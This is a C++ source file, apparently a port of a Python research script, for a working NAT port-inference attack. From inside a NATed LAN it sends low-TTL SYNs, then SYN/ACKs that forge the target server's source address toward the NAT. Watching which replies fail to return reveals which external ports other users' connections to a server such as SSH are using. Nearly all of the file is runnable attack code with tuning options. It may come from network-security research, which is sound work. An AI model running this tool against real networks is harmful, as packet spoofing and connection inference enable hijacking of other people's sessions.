// Build:  make -f Makefile.infer     (or: g++ -O3 -o port_infer port_infer.cpp -pthread -ltins -std=c++17)
// Run:    sudo ./port_infer

#include <iostream>
#include <vector>
#include <atomic>
#include <thread>
#include <cstdint>
#include <cstring>
#include <unistd.h>
#include <getopt.h>
#include <sys/time.h>
#include <tins/tins.h>

using namespace std;
using namespace Tins;

// ---------- CONFIG (from port_infer1.py) ----------
static string   ATTACKER_IP = "192.168.8.7";   // attacker's private IP in the NATed LAN
static string   SERVER_IP   = "20.0.0.2";   // target server IP
static uint16_t SERVER_PORT = 22;             // target server port
static string   NAT_IP      = "20.0.0.1";    // NAT public IP
static string   IFACE       = "wlo1";
static uint16_t START_PORT  = 32768;
static uint16_t END_PORT    = 65535;
static int      TTL_SYN     = 2;
static int      TTL_SYNACK  = 4;
static uint32_t SEQ_C       = 1000;
static uint32_t SEQ_S       = 2000;
static int      ROUNDS      = 3;      // confirmation rounds a port must miss to count as in-use
static int      BATCH       = 1000;   // ports per batch (small bursts -> low packet loss)
static int      SEND_GAP_US = 10;     // inter-packet spacing while blasting
static int      SETTLE_US   = 100000; // gap between SYN blast and SYN/ACK blast within a batch (0.1 s)
static int      WAIT_US     = 200000; // final drain wait after last batch each round (0.2 s)
// --------------------------------------------------

static int NPORTS;
static vector<char> received;         // received[p-START_PORT] = 1 if SYN/ACK came back to us
static atomic<bool> done_flag{false};

static vector<IP> syn_pkts;           // attacker -> server, SYN
static vector<IP> synack_pkts;        // server   -> nat,    SYN/ACK

static double now_ms() {
    struct timeval t; gettimeofday(&t, nullptr);
    return t.tv_sec * 1000.0 + t.tv_usec / 1000.0;
}

// ---- sniffer: record dport of SYN/ACKs from server -> attacker ----
static IPv4Address g_server, g_attacker;

static bool on_packet(const PDU& pdu) {
    const IP*  ip  = pdu.find_pdu<IP>();
    const TCP* tcp = pdu.find_pdu<TCP>();
    if (!ip || !tcp) return !done_flag;
    if (ip->src_addr() == g_server && ip->dst_addr() == g_attacker &&
        tcp->sport() == SERVER_PORT &&
        (tcp->flags() & (TCP::SYN | TCP::ACK)) == (TCP::SYN | TCP::ACK)) {
        uint16_t dp = tcp->dport();
        if (dp >= START_PORT && dp <= END_PORT)
            received[dp - START_PORT] = 1;
    }
    return !done_flag;
}

static void sniff_thread() {
    SnifferConfiguration cfg;
    cfg.set_filter("tcp and src host " + SERVER_IP + " and src port " +
                   to_string(SERVER_PORT) + " and (tcp[13] & 0x12) == 0x12 and dst host " +
                   ATTACKER_IP);
    cfg.set_immediate_mode(true);
    cfg.set_buffer_size(64u << 20); // 64 MB kernel capture buffer to survive reply bursts
    Sniffer sniffer(IFACE, cfg);
    sniffer.sniff_loop(on_packet);
}

// ---- prebuild all packets once ----
static void build_packets() {
    syn_pkts.reserve(NPORTS);
    synack_pkts.reserve(NPORTS);
    for (int i = 0; i < NPORTS; i++) {
        uint16_t port = START_PORT + i;

        IP syn = IP(SERVER_IP, ATTACKER_IP) / TCP(SERVER_PORT, port);
        syn.ttl(TTL_SYN);
        syn.rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        syn.rfind_pdu<TCP>().seq(SEQ_C);
        syn_pkts.push_back(syn);

        IP sa = IP(NAT_IP, SERVER_IP) / TCP(port, SERVER_PORT);
        sa.ttl(TTL_SYNACK);
        sa.rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        sa.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
        sa.rfind_pdu<TCP>().seq(SEQ_S);
        sa.rfind_pdu<TCP>().ack_seq(SEQ_C + 1);
        synack_pkts.push_back(sa);
    }
}

static string compress_ranges(const vector<uint16_t>& v) {
    if (v.empty()) return "";
    string out; int s = v[0], prev = v[0];
    auto flush = [&](int a, int b) {
        if (!out.empty()) out += ",";
        out += (a == b) ? to_string(a) : (to_string(a) + "-" + to_string(b));
    };
    for (size_t i = 1; i < v.size(); i++) {
        if (v[i] == prev + 1) { prev = v[i]; continue; }
        flush(s, prev); s = prev = v[i];
    }
    flush(s, prev);
    return out;
}

static void usage(const char* prog) {
    cerr << "usage: " << prog << " [opts]\n"
         << "  -a attacker_ip   (" << ATTACKER_IP << ")\n"
         << "  -s server_ip     (" << SERVER_IP << ")\n"
         << "  -p server_port   (" << SERVER_PORT << ")\n"
         << "  -n nat_ip        (" << NAT_IP << ")\n"
         << "  -i iface         (" << IFACE << ")\n"
         << "  -S start_port    (" << START_PORT << ")\n"
         << "  -E end_port      (" << END_PORT << ")\n"
         << "  -r rounds        (" << ROUNDS << ")\n"
         << "  -b batch         (" << BATCH << ")\n"
         << "  -g send_gap_us   (" << SEND_GAP_US << ")\n"
         << "  -c settle_us     (" << SETTLE_US << ")\n"
         << "  -w wait_us       (" << WAIT_US << ")\n"
         << "  -t ttl_syn       (" << TTL_SYN << ")\n"
         << "  -T ttl_synack    (" << TTL_SYNACK << ")\n"
         << "  -d               dump first crafted SYN & SYN/ACK, then exit (no send)\n";
}

int main(int argc, char** argv) {
    bool dump = false;
    int opt;
    while ((opt = getopt(argc, argv, "a:s:p:n:i:S:E:r:b:g:c:w:t:T:dh")) != -1) {
        switch (opt) {
            case 'a': ATTACKER_IP = optarg; break;
            case 's': SERVER_IP   = optarg; break;
            case 'p': SERVER_PORT = (uint16_t)atoi(optarg); break;
            case 'n': NAT_IP      = optarg; break;
            case 'i': IFACE       = optarg; break;
            case 'S': START_PORT  = (uint16_t)atoi(optarg); break;
            case 'E': END_PORT    = (uint16_t)atoi(optarg); break;
            case 'r': ROUNDS      = atoi(optarg); break;
            case 'b': BATCH       = atoi(optarg); break;
            case 'g': SEND_GAP_US = atoi(optarg); break;
            case 'c': SETTLE_US   = atoi(optarg); break;
            case 'w': WAIT_US     = atoi(optarg); break;
            case 't': TTL_SYN     = atoi(optarg); break;
            case 'T': TTL_SYNACK  = atoi(optarg); break;
            case 'd': dump = true; break;
            case 'h': default: usage(argv[0]); return (opt == 'h') ? 0 : 1;
        }
    }

    NPORTS = END_PORT - START_PORT + 1;
    received.assign(NPORTS, 0);
    g_server   = IPv4Address(SERVER_IP);
    g_attacker = IPv4Address(ATTACKER_IP);

    cout << "port_infer  attacker=" << ATTACKER_IP << " server=" << SERVER_IP
         << ":" << SERVER_PORT << " nat=" << NAT_IP << " iface=" << IFACE
         << " ports=" << START_PORT << "-" << END_PORT << " rounds=" << ROUNDS << "\n";

    build_packets();

    if (dump) {
        auto show = [](const char* tag, IP& p) {
            TCP& t = p.rfind_pdu<TCP>();
            cout << tag << " src=" << p.src_addr() << " dst=" << p.dst_addr()
                 << " ttl=" << (int)p.ttl()
                 << " sport=" << t.sport() << " dport=" << t.dport()
                 << " flags=0x" << hex << (int)t.flags() << dec
                 << " seq=" << t.seq() << " ack=" << t.ack_seq() << "\n";
        };
        show("SYN   ", syn_pkts[0]);
        show("SYNACK", synack_pkts[0]);
        return 0;
    }

    thread sniffer(sniff_thread);
    usleep(100000); // let the sniffer come up

    PacketSender sender;
    NetworkInterface nic(IFACE);
    double t0 = now_ms();

    // candidates start as the full range; each round we re-probe only the
    // ports that have NOT returned yet. A port surviving all ROUNDS is in use.
    vector<uint16_t> candidates(NPORTS);
    for (int i = 0; i < NPORTS; i++) candidates[i] = START_PORT + i;

    for (int r = 0; r < ROUNDS && !candidates.empty(); r++) {
        double rt = now_ms();
        // Process candidates in small batches so each SYN/ACK reply burst stays
        // small (low capture/NAT loss). The sniffer runs continuously across all
        // batches; we only tally which ports returned after the whole round.
        for (size_t off = 0; off < candidates.size(); off += BATCH) {
            size_t end = min(off + (size_t)BATCH, candidates.size());
            // Stage 1: SYNs attacker -> server (create NAT mappings for this batch)
            for (size_t i = off; i < end; i++) {
                sender.send(syn_pkts[candidates[i] - START_PORT], nic);
                if (SEND_GAP_US) usleep(SEND_GAP_US);
            }
            usleep(SETTLE_US); // let the mappings settle before the crafted SYN/ACKs
            // Stage 2: crafted SYN/ACKs server -> nat
            for (size_t i = off; i < end; i++) {
                sender.send(synack_pkts[candidates[i] - START_PORT], nic);
                if (SEND_GAP_US) usleep(SEND_GAP_US);
            }
        }
        usleep(WAIT_US); // let the last batch's replies drain

        // keep only ports that did NOT come back (tallied at round end)
        vector<uint16_t> still_missing;
        still_missing.reserve(candidates.size());
        for (uint16_t p : candidates)
            if (!received[p - START_PORT]) still_missing.push_back(p);

        cout << "round " << (r + 1) << ": probed " << candidates.size()
             << " in batches of " << BATCH << " -> still missing " << still_missing.size()
             << "  (" << (now_ms() - rt) << " ms)\n";
        candidates.swap(still_missing);
    }

    done_flag = true;

    cout << "\n=== IN-USE ports (no SYN/ACK returned in " << ROUNDS << " rounds): "
         << candidates.size() << " ===\n";
    cout << compress_ranges(candidates) << "\n";
    cout << "total time: " << (now_ms() - t0) << " ms\n";

    // nudge the sniffer's blocking loop to exit
    sender.send(synack_pkts[0], nic);
    usleep(50000);
    sniffer.detach();
    return 0;
}
